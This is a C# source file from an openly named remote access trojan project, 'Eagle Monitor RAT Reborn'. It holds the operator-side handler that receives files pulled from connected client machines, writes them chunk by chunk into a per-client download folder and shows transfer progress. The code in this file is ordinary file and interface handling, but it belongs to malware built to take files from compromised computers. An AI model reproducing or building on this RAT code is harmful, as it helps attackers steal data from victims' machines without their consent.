using Eagle_Monitor_RAT_Reborn.Network;
using PacketLib.Packet;
using System;
using System.IO;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class DownloadFilePacketHandler
    {
        public DownloadFilePacketHandler(DownloadFilePacket downloadFilePacket, ClientHandler clientHandler) : base()
        {

            using (var stream = new FileStream(ClientHandler.ClientHandlersList[downloadFilePacket.BaseIp].ClientPath + "\\Downloaded Files\\" + Misc.Utils.SplitPath(downloadFilePacket.fileName), FileMode.Append))
            {
                stream.Write(downloadFilePacket.file, 0, downloadFilePacket.file.Length);
            }

            ClientHandler.ClientHandlersList[downloadFilePacket.BaseIp].ClientForm.dowloadFileDataGridView.BeginInvoke((MethodInvoker)(() =>
            {
                DataGridViewRow row = ClientHandler.ClientHandlersList[downloadFilePacket.BaseIp].ClientForm.DownloadList[downloadFilePacket.fileTicket];
                long currentSize = long.Parse(row.Cells["Column29"].Tag.ToString()) + downloadFilePacket.file.Length;

                row.Cells["Column29"].Tag = currentSize;

                decimal pourcentage = (decimal)currentSize / long.Parse(row.Tag.ToString());
                decimal final = Decimal.Round(pourcentage * 100, 2);

                row.Cells["Column30"].Value = $"{final}%";

                row.Cells["Column29"].Value = $"{Misc.Utils.Numeric2Bytes(currentSize)} / {Misc.Utils.Numeric2Bytes(long.Parse(row.Tag.ToString()))}";

                if (currentSize == long.Parse(row.Tag.ToString()))
                {
                    clientHandler.Dispose();
                    if (Program.settings.autoRemoveRowWhenFileIsDownloaded)
                    {
                        ClientHandler.ClientHandlersList[downloadFilePacket.BaseIp].ClientForm.dowloadFileDataGridView.Rows.Remove(row);
                        ClientHandler.ClientHandlersList[downloadFilePacket.BaseIp].ClientForm.DownloadList.Remove(downloadFilePacket.fileTicket);
                    }
                }
                downloadFilePacket.file = null;
            })); 
        }
    }
}
